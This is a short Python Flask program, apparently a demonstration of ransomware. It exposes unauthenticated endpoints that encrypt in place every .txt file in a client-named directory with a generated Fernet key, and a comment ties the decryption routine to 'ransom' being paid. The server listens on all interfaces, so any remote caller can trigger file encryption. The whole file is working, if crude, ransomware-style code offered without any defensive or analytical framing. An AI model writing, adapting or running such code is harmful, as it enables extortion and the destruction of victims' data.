from flask import Flask, request, jsonify
import os
from cryptography.fernet import Fernet

app = Flask(__name__)

# Generate a key for encryption
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt files in a directory
def encrypt_files(directory):
    for filename in os.listdir(directory):
        if filename.endswith('.txt'):  # Encrypt only text files for demonstration
            with open(os.path.join(directory, filename), 'r') as file:
                data = file.read().encode()
            encrypted_data = cipher.encrypt(data)
            with open(os.path.join(directory, filename), 'wb') as file:
                file.write(encrypted_data)

# Decrypt files if ransom is paid
def decrypt_files(directory):
    for filename in os.listdir(directory):
        if filename.endswith('.txt'):
            with open(os.path.join(directory, filename), 'rb') as file:
                encrypted_data = file.read()
            decrypted_data = cipher.decrypt(encrypted_data)
            with open(os.path.join(directory, filename), 'w') as file:
                file.write(decrypted_data.decode())

@app.route('/encrypt', methods=['POST'])
def encrypt():
    directory = request.json.get('directory')
    encrypt_files(directory)
    return jsonify({"status": "files encrypted"})

@app.route('/decrypt', methods=['POST'])
def decrypt():
    directory = request.json.get('directory')
    decrypt_files(directory)
    return jsonify({"status": "files decrypted"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
